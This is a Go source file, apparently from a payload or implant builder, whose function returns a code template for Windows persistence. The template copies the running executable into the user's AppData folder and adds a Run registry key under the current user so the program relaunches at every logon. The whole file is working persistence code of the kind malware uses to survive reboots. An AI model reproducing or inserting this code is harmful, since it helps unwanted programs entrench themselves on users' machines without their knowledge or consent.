package tools

import "fmt"

func GetPersistTemplate() string {
	return fmt.Sprintf(`
package main

import (
	"io"
	"os"
	"strings"

	"golang.org/x/sys/windows/registry"
)

func getCurrentProcessPath() string {
	path, err := os.Executable()
	if err != nil {
		return ""
	}
	return path
}

func filenameToName(filename string) string {
	filename_splitted := strings.Split(filename, ".")
	return filename_splitted[0]
}

func getAppDataPath() string {
	path, err := os.UserConfigDir()
	if err != nil {
		return ""
	}
	return path
}

func getRegistryKey(keyName string) (string, error) {
	k, err := registry.OpenKey(registry.CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", registry.QUERY_VALUE)
	if err != nil {
		return "", err
	}
	defer k.Close()

	s, _, err := k.GetStringValue(keyName)
	if err != nil {
		return "", err
	}
	return s, err
}

func SetRegistryValue(keyName string, keyValue string) error {

	k, err := registry.OpenKey(registry.CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer k.Close()

	err = k.SetStringValue(keyName, keyValue)
	if err != nil {
		return err
	}
	return err
}

func fileExists(filename string) bool {
	info, err := os.Stat(filename)
	if os.IsNotExist(err) {
		return false
	}
	return !info.IsDir()
}

func copyFile(src string, dest string) {
	in, err := os.Open(src)
	if err != nil {
		return
	}
	defer in.Close()
	out, err := os.Create(dest)
	if err != nil {
		return
	}
	defer func() {
		cerr := out.Close()
		if err == nil {
			err = cerr
		}
	}()
	if _, err = io.Copy(out, in); err != nil {
		return
	}
	err = out.Sync()
	return
}

func persistExecute(outFile string) {
	currentFilePath := getCurrentProcessPath()
	keyName := filenameToName(outFile)
	installFile := getAppDataPath() + "\\" + outFile

	if !fileExists(installFile) {
		copyFile(currentFilePath, installFile)

	}
	keyVal, err := getRegistryKey(keyName)
	if err != nil || keyVal != installFile {
		SetRegistryValue(keyName, installFile)
	}

}
`)
}
